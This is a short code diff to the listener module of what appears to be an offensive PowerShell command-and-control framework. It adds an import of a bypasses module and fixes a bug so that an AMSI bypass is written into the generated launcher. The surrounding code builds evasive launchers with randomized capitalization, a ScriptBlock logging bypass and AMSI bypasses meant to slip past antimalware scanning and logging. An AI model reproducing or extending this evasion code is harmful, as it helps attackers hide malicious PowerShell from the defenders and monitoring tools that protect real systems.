@@ -17,6 +17,7 @@ from lib.common import agents
 from lib.common import encryption
 from lib.common import packets
 from lib.common import messages
+from lib.common import bypasses
 
 class Listener:
     def __init__(self, mainMenu, params=[]):
@@ -189,9 +190,6 @@ class Listener:
                 launcher = "$ErrorActionPreference = 'SilentlyContinue';" #Set as empty string for debugging
 
                 if safeChecks.lower() == 'true':
-                    launcher += helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
-
-                if safeChecks.lower() == 'true':
                     launcher = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
                     # ScriptBlock Logging bypass
                     if scriptLogBypass:
@@ -201,7 +199,7 @@ class Listener:
                         launcher += bypasses.AMSIBypass()
                     # rastamouse AMSI bypass
                     if AMSIBypass2:
-                        stager += bypasses.AMSIBypass2()
+                        launcher += bypasses.AMSIBypass2()
                     launcher += "};"
                     launcher += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
 
